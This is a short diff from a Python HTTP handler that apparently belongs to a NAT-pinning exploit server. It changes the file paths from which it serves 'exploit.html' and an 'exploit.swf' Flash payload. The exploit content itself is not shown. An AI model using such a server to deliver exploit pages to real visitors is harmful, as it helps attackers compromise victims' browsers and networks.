@@ -37,12 +37,12 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 		if page != "":
 			if page=="exploit.html":
 				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: 62.213.198.42\r\nContent-Length: $len$\r\n\r\n"""
-				f = open("../exploit/exploit.html","r")
+				f = open("exploit/exploit.html","r")
 				body = f.read()
 				f.close()
 			elif page=="exploit.swf":
 				respheader="""HTTP/1.1 200 OK\r\nContent-Type: application/x-shockwave-flash\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
-				f = open("../exploit/exploit.swf","r")
+				f = open("exploit/exploit.swf","r")
 				body = f.read()
 				f.close()
 			else:
